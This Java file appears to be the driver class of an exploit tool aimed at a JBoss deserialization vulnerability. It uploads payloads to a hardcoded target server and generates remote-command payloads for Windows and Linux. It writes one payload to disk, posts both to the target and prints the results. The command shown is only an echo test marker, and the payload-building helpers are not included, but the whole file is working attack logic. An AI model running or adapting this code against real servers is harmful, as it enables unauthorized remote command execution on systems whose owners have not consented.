package com.jboss.main;

import java.io.File;
import java.io.FileOutputStream;

public class Test {
    public Test() {
    }

    public static void main(String[] args) {
        Payload payload = new Payload();
//        String url = args[0];
        String command = "echo test_for_jbossvul_12149";
        String url = "http://192.168.116.132:8080";
        try {
            byte[] win = payload.upload("windows");
            byte[] lin = payload.upload("Linux");
            doPost.DoPost(url, win);
            doPost.DoPost(url, lin);
            byte[] winpayload = payload.PayloadGeneration(command, "windows");
            byte[] linpayload = payload.PayloadGeneration(command, "linux");
            FileOutputStream linux = new FileOutputStream(new File("linux"));
            linux.write(linpayload);
            linux.close();
            String result = doPost.DoPost(url, winpayload);
            String result2 = doPost.DoPost(url, linpayload);
            System.out.println(result + result2.trim());
        } catch (Exception var9) {
            var9.printStackTrace();
        }

    }
}
